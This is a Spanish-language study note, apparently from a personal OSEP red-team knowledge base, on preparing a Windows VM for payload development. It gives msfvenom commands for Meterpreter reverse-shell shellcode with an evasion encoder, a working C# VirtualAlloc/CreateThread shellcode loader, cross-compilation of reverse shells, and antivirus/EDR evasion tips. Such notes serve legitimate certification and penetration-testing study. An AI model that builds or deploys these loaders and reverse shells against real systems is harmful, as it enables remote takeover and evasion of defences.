---
title: Development Machine Preparation
draft: false
tags:
  - setup
  - osep
  - development
---

> [!Info]
> En OSEP, la **Development Machine** es una VM Windows (típicamente Windows 10/11) donde se compilan y desarrollan los payloads (shellcode loaders, implantes en C#/C++, macros VBA, etc.). No confundir con la [[Kali VM Preparation|Kali VM]] que se usa para el reconocimiento y explotación.

---

# Visual Studio Community

1. Descarga [Visual Studio Community](https://visualstudio.microsoft.com/vs/community/) (gratuito).
2. Durante la instalación, selecciona los workloads:
   - **Desktop development with C++** — para payloads nativos / shellcode loaders.
   - **.NET desktop development** — para implantes en C# (el más común en OSEP).
3. Asegúrate de instalar el **Windows SDK** (incluido en ambos workloads).

---

# .NET y C# para payloads

La mayoría de los implantes y Process Injection PoCs en OSEP están escritos en C#.

```powershell
# Verificar versiones de .NET instaladas
PS> dotnet --list-sdks
PS> Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version -EA 0
```

> [!Note]
> Compila los proyectos en **Release / x64** salvo que el target sea x86. Para shellcode injection, presta atención al bitness del proceso víctima (ver [[Basic Windows Concepts]]).

Paquetes NuGet útiles para payloads:
- `DInvoke` / `D/Invoke` — dynamic P/Invoke para evasión de hooks (ver [[Process Injection]]).
- `SharpSploit` — librería ofensiva en C# para múltiples técnicas.

---

# Compilación cruzada (Windows → Linux / Kali)

Para compilar ejecutables Windows desde Kali sin levantar la VM de desarrollo:

```bash
# Compilar C# con Mono (básico, puede haber incompatibilidades con .NET Core)
$ sudo apt install mono-complete
$ mcs payload.cs -out:payload.exe

# Cross-compilar C/C++ para Windows con mingw-w64 (ya instalado en Kali VM Preparation)
$ x86_64-w64-mingw32-gcc payload.c -o payload.exe       # 64-bit
$ i686-w64-mingw32-gcc   payload.c -o payload32.exe     # 32-bit

# Con soporte para Winsock (reverse shells en C)
$ x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
```

---

# Herramientas de desarrollo de payloads

| Herramienta | Uso | URL |
|---|---|---|
| **Donut** | Convierte .NET/PE/shellcode a positionindependent shellcode | https://github.com/TheWover/donut |
| **PEzor** | Empaqueta shellcode en PE, DLL, reflective loader | https://github.com/phra/PEzor |
| **sRDI** | Shellcode Reflective DLL Injection | https://github.com/monoxgas/sRDI |
| **msfvenom** | Genera shellcode en múltiples formatos (raw, c, csharp...) | (incluido en Kali) |
| **Salsa Tools** | ShellReverse en múltiples lenguajes y encodings | https://github.com/alxhlr/Salsa-Tools |

---

# Generación de shellcode con msfvenom

```bash
# Shellcode raw (para inyectar en un loader)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.bin

# Shellcode en formato C# (byte array listo para pegar en un loader)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o shell.cs

# Shellcode en formato C (para un loader en C/C++)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -o shell.c

# Con encoder para evasión básica (x64 tiene menos encoders que x86)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -e x64/xor_dynamic -i 5 -f csharp -o shell_encoded.cs
```

---

# Skeleton de loader C# (Process Injection básico)

Punto de partida para un loader VirtualAlloc + CreateThread en el proceso actual:

```csharp
using System;
using System.Runtime.InteropServices;

class Loader {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(
        IntPtr lpAttr, uint dwStackSize, IntPtr lpStart, IntPtr param, uint dwFlags, IntPtr lpId);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);

    static void Main() {
        // Reemplaza con el output de: msfvenom ... -f csharp
        byte[] buf = new byte[] { 0xfc, 0x48, /* ... */ };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40); // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

> [!Caution]
> `PAGE_EXECUTE_READWRITE (0x40)` en VirtualAlloc es muy ruidoso para AV/EDR. En escenarios reales, separa la asignación (RW) de la ejecución (RX) con `VirtualProtect`. Ver [[Process Injection]] y [[AV Evasion]].

---

# Relacionado

- [[Kali VM Preparation]] — setup del atacante (Kali).
- [[content/Pentra/👹 Red-Teaming/Windows/Phishing with Microsoft Office]] — macros VBA como vector de entrega.
- [[Process Injection]] — técnicas para inyectar shellcode.
- [[AV Evasion]] — evasión de antivirus y EDR.
- [[Basic Windows Concepts]] — WOW64, Win32 API, registro (base para entender el entorno).
